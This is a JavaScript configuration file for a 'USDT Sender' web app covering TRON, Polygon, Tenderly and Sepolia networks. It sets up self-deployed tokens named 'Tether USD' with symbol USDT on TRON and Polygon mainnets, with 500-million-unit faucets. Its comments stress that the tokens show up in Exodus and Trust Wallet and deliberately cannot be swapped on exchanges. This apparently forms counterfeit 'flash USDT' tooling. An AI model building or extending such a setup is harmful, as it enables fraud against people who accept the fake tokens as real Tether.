// USDT Sender — Configuration
// Supports: TRON Mainnet (TRC-20) + Polygon Mainnet + Tenderly VNet + Sepolia Testnet

const CONFIG = {

  // =====================================================================
  // ACTIVE NETWORK / TOKEN — persisted in localStorage
  // =====================================================================
  _activeNetworkKey: localStorage.getItem('usdt_network') || 'tron',
  _activeTokenByNetwork: (function () {
    try {
      return JSON.parse(localStorage.getItem('usdt_token_by_network') || '{}');
    } catch (e) {
      return {};
    }
  })(),

  get activeNetworkKey() { return this._activeNetworkKey; },
  set activeNetworkKey(key) {
    this._activeNetworkKey = key;
    localStorage.setItem('usdt_network', key);
  },

  get activeTokenKey() {
    var netKey = this._activeNetworkKey;
    var saved = this._activeTokenByNetwork[netKey];
    var tokens = this.NETWORKS[netKey] && this.NETWORKS[netKey].tokens ? this.NETWORKS[netKey].tokens : {};
    if (saved && tokens[saved]) return saved;
    return tokens.usdt ? 'usdt' : Object.keys(tokens)[0] || 'usdt';
  },
  set activeTokenKey(key) {
    var netKey = this._activeNetworkKey;
    var tokens = this.NETWORKS[netKey] && this.NETWORKS[netKey].tokens ? this.NETWORKS[netKey].tokens : {};
    if (!tokens[key]) return;
    this._activeTokenByNetwork[netKey] = key;
    localStorage.setItem('usdt_token_by_network', JSON.stringify(this._activeTokenByNetwork));
  },

  // Computed getters — always reflect active network + token
  get NETWORK() { return this.NETWORKS[this._activeNetworkKey]; },
  get TOKENS() { return this.NETWORK.tokens || {}; },
  get TOKEN_KEY() { return this.activeTokenKey; },
  get TOKEN() { return this.TOKENS[this.TOKEN_KEY] || this.DEFAULT_TOKEN; },
  get TOKEN_CONTRACT_ADDRESS() { return this.TOKEN.address || ''; },
  get TOKEN_ABI() { return this.NETWORK.abi; },
  get TOKEN_DECIMALS() { return Number(this.TOKEN.decimals || 6); },
  get TOKEN_HAS_FAUCET() {
    if (this.NETWORK.key === 'tenderly') return true;
    return Boolean(this.TOKEN.hasFaucet);
  },

  // Backward-compatible aliases used in existing app code
  get USDT_CONTRACT_ADDRESS() { return this.TOKEN_CONTRACT_ADDRESS; },
  get FAUCET_AMOUNT() { return (this.TOKEN && this.TOKEN.faucetAmount) || this.NETWORK.faucetAmount; },
  get USDT_ABI() { return this.TOKEN_ABI; },
  get USDT_DECIMALS() { return this.TOKEN_DECIMALS; },

  // =====================================================================
  // NETWORK DEFINITIONS
  // =====================================================================
  NETWORKS: {

    // ── TRON Mainnet (TRC-20) ─────────────────────────────────────────────
    // Custom USDT TRC-20 — visible in Exodus, Trust Wallet, TronLink
    // Transfer between wallets ✅ · Cannot swap on DEXes ✅ · Gas ~1-5 TRX
    // Deploy first: node deploy-tron.js → paste address in usdtAddress below
    tron: {
      key: 'tron',
      label: 'TRON Mainnet',
      shortLabel: 'TRON',
      description: 'TRON · TRC-20 USDT · Visible dans Exodus/Trust/TronLink · Frais ~1 TRX',
      chainId: null,
      chainIdDecimal: null,
      chainName: 'TRON Mainnet',
      rpcUrl: 'https://api.trongrid.io',
      rpcUrls: [
        'https://api.trongrid.io',
        'https://rpc.tron.network',
        'https://trx.api.openalliance.org'
      ],
      blockExplorer: 'https://tronscan.org/#',
      faucetAmount: 500000000,
      transferMode: 'tron',
      requiresGas: true,
      icon: '🔴',
      color: '#ef0027',
      tokens: {
        usdt: {
          name: 'Tether USD',
          symbol: 'USDT',
          decimals: 6,
          image: '/usdt-logo.png',
          address: 'TL5cRxJYNRPwFfJ1PymGTCx2LBFw3xiEJM',
          hasFaucet: true
        },
        usdc: {
          name: 'USD Coin',
          symbol: 'USDC',
          decimals: 6,
          image: '/usdc-logo.svg',
          address: '',  // Deploy: node deploy-usdc-tron.js → paste address here
          hasFaucet: true,
          faucetAmount: 400000000
        },
        afrx: {
          name: 'AfriChainX',
          symbol: 'AFRX',
          decimals: 18,
          image: '/afrx-logo.png',
          address: '',  // Deploy: node deploy-afrx.js → paste address here
          hasFaucet: false,
          isAfrx: true,
          platformWallet: 'TWCyjobnSPKvmYUJ3JYfKa98cBZ5bTXo3n',
          sunswapPair: ''  // Fill after adding SunSwap liquidity
        },
        uscadx: {
          name: 'USCA Dollar X',
          symbol: 'USCADX',
          decimals: 6,
          image: '/uscadx-logo.png',
          address: '',  // Deploy: node deploy-uscadx.js → paste address here
          hasFaucet: true,
          faucetAmount: 500000000,
          isUscadx: true
        }
      },
      abi: [
        { "inputs": [{ "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
        { "inputs": [{ "name": "to", "type": "address" }, { "name": "value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
        { "inputs": [{ "name": "from", "type": "address" }, { "name": "to", "type": "address" }, { "name": "value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
        { "inputs": [{ "name": "spender", "type": "address" }, { "name": "value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
        { "inputs": [{ "name": "owner", "type": "address" }, { "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
        { "inputs": [], "name": "claimFaucet", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
        { "inputs": [{ "name": "account", "type": "address" }], "name": "hasClaimed", "outputs": [{ "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" },
        { "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint8" }], "stateMutability": "view", "type": "function" },
        { "inputs": [], "name": "symbol", "outputs": [{ "name": "", "type": "string" }], "stateMutability": "view", "type": "function" },
        { "inputs": [], "name": "name", "outputs": [{ "name": "", "type": "string" }], "stateMutability": "view", "type": "function" },
        { "inputs": [], "name": "totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
        { "inputs": [{ "name": "to", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "mint", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
        { "inputs": [{ "name": "target", "type": "address" }], "name": "blockAddress", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
        { "inputs": [{ "name": "target", "type": "address" }], "name": "unblockAddress", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
        { "inputs": [], "name": "owner", "outputs": [{ "name": "", "type": "address" }], "stateMutability": "view", "type": "function" },
        { "anonymous": false, "inputs": [{ "indexed": true, "name": "from", "type": "address" }, { "indexed": true, "name": "to", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" },
        { "anonymous": false, "inputs": [{ "indexed": true, "name": "owner", "type": "address" }, { "indexed": true, "name": "spender", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }
      ]
    },

    // ── Polygon Mainnet ───────────────────────────────────────────────────
    // Custom USDT token — visible in Exodus, Trust Wallet, MetaMask
    // Transfer between wallets ✅ · Cannot swap on DEXes ✅ · Gas ~$0.001
    // Deploy first: node deploy-polygon.js → paste address in usdtAddress below
    polygon: {
      key: 'polygon',
      label: 'Polygon Mainnet',
      shortLabel: 'Polygon',
      description: 'Polygon · USDT visible dans Exodus/Trust/MetaMask · Frais ~$0.001',
      chainId: '0x89',
      chainIdDecimal: 137,
      chainName: 'Polygon Mainnet',
      rpcUrl: 'https://polygon-rpc.com',
      rpcUrls: [
        'https://polygon-rpc.com',
        'https://rpc.ankr.com/polygon',
        'https://polygon.llamarpc.com'
      ],
      blockExplorer: 'https://polygonscan.com',
      faucetAmount: 500000000,
      transferMode: 'onchain',
      requiresGas: true,
      icon: '🟣',
      color: '#8247e5',
      tokens: {
        usdt: {
          name: 'Tether USD',
          symbol: 'USDT',
          decimals: 6,
          image: '/usdt-logo.png',
          address: '',
          hasFaucet: true
        },
        usdc: {
          name: 'USD Coin',
          symbol: 'USDC',
          decimals: 6,
          image: '/usdc-logo.svg',
          address: '',  // Deploy: node deploy-usdc-polygon.js → paste address here
          hasFaucet: true,
          faucetAmount: 400000000
        }
      },
      abi: [
        { "inputs": [{ "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
        { "inputs": [{ "name": "to", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
        { "inputs": [], "name": "claimFaucet", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
        { "inputs": [{ "name": "account", "type": "address" }], "name": "hasClaimed", "outputs": [{ "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" },
        { "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint8" }], "stateMutability": "view", "type": "function" },
        { "inputs": [], "name": "symbol", "outputs": [{ "name": "", "type": "string" }], "stateMutability": "view", "type": "function" },
        { "inputs": [], "name": "totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
        { "inputs": [{ "name": "to", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "mint", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
        { "inputs": [], "name": "owner", "outputs": [{ "name": "", "type": "address" }], "stateMutability": "view", "type": "function" },
        { "anonymous": false, "inputs": [{ "indexed": true, "name": "from", "type": "address" }, { "indexed": true, "name": "to", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }
      ]
    },

    // ── Tenderly Virtual Mainnet ──────────────────────────────────────────
    tenderly: {
      key: 'tenderly',
      label: 'Tenderly Mainnet',
      shortLabel: 'Tenderly',
      description: 'Fork Ethereum · USDT $1.00 · 500M USDT · Sans gaz',
      chainId: '0x1',
      chainIdDecimal: 1,
      chainName: 'Ethereum Mainnet (Tenderly)',
      rpcUrl: 'https://virtual.mainnet.eu.rpc.tenderly.co/73648ae7-6c02-4aa8-9e6b-563cd66f8d3c',
      rpcUrls: ['https://virtual.mainnet.eu.rpc.tenderly.co/73648ae7-6c02-4aa8-9e6b-563cd66f8d3c'],
      blockExplorer: 'https://dashboard.tenderly.co/explorer/vnet/73648ae7-6c02-4aa8-9e6b-563cd66f8d3c',
      faucetAmount: 500000000,
      transferMode: 'tenderly',
      requiresGas: false,
      icon: '🟣',
      color: '#9b59b6',
      tokens: {
        usdt: {
          name: 'Tether USD',
          symbol: 'USDT',
          decimals: 6,
          image: '/usdt-logo.png',
          address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
          hasFaucet: true
        },
        usdc: {
          name: 'USD Coin',
          symbol: 'USDC',
          decimals: 6,
          image: '/usdc-logo.svg',
          address: '0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48',
          hasFaucet: true,
          faucetAmount: 400000000
        },
        afrx: {
          name: 'AfriChainX',
          symbol: 'AFRX',
          decimals: 18,
          image: '/afrx-logo.png',
          address: '',
          hasFaucet: false,
          isAfrx: true
        },
        uscadx: {
          name: 'USCA Dollar X',
          symbol: 'USCADX',
          decimals: 6,
          image: '/uscadx-logo.png',
          address: '',
          hasFaucet: true,
          faucetAmount: 500000000,
          isUscadx: true
        }
      },
      abi: [
        { "inputs": [{ "name": "who", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
        { "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
        { "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint8" }], "stateMutability": "view", "type": "function" },
        { "inputs": [], "name": "symbol", "outputs": [{ "name": "", "type": "string" }], "stateMutability": "view", "type": "function" },
        { "inputs": [], "name": "totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
        { "anonymous": false, "inputs": [{ "indexed": true, "name": "from", "type": "address" }, { "indexed": true, "name": "to", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }
      ]
    },

    // ── Sepolia Testnet ───────────────────────────────────────────────────
    sepolia: {
      key: 'sepolia',
      label: 'Sepolia Testnet',
      shortLabel: 'Sepolia',
      description: 'Ethereum Testnet · Transactions réelles · Etherscan',
      chainId: '0xaa36a7',
      chainIdDecimal: 11155111,
      chainName: 'Sepolia Testnet',
      rpcUrl: 'https://rpc.sepolia.org',
      rpcUrls: [
        'https://rpc.sepolia.org',
        'https://ethereum-sepolia-rpc.publicnode.com',
        'https://sepolia.drpc.org'
      ],
      blockExplorer: 'https://sepolia.etherscan.io',
      faucetAmount: 500000000,
      transferMode: 'onchain',
      requiresGas: true,
      icon: '🔵',
      color: '#3498db',
      tokens: {
        usdt: {
          name: 'Tether USD',
          symbol: 'USDT',
          decimals: 6,
          image: '/usdt-logo.png',
          address: '0x4674DC31EEF6CB9F4B2aD8a120d2055f65bb2fDA',
          hasFaucet: true
        },
        usdc: {
          name: 'USD Coin',
          symbol: 'USDC',
          decimals: 6,
          image: '/usdc-logo.svg',
          address: '',  // Deploy: node deploy-usdc.js → paste address here
          hasFaucet: true,
          faucetAmount: 400000000
        }
      },
      abi: [
        { "inputs": [{ "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
        { "inputs": [{ "name": "to", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
        { "inputs": [], "name": "claimFaucet", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
        { "inputs": [{ "name": "account", "type": "address" }], "name": "hasClaimed", "outputs": [{ "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" },
        { "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint8" }], "stateMutability": "view", "type": "function" },
        { "inputs": [], "name": "symbol", "outputs": [{ "name": "", "type": "string" }], "stateMutability": "view", "type": "function" },
        { "inputs": [], "name": "totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
        { "anonymous": false, "inputs": [{ "indexed": true, "name": "from", "type": "address" }, { "indexed": true, "name": "to", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }
      ]
    }
  },

  // =====================================================================
  // TOKEN INFO
  // =====================================================================
  DEFAULT_TOKEN: {
    name: 'Tether USD',
    symbol: 'USDT',
    decimals: 6,
    image: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png',
    address: ''
  },

  SUPPORTED_TOKEN_ORDER: ['usdt', 'usdc', 'afrx', 'uscadx'],

  // Confirmations required
  CONFIRMATIONS_REQUIRED: 1,

  // Tenderly VNET ID
  TENDERLY_VNET_ID: "73648ae7-6c02-4aa8-9e6b-563cd66f8d3c"
};
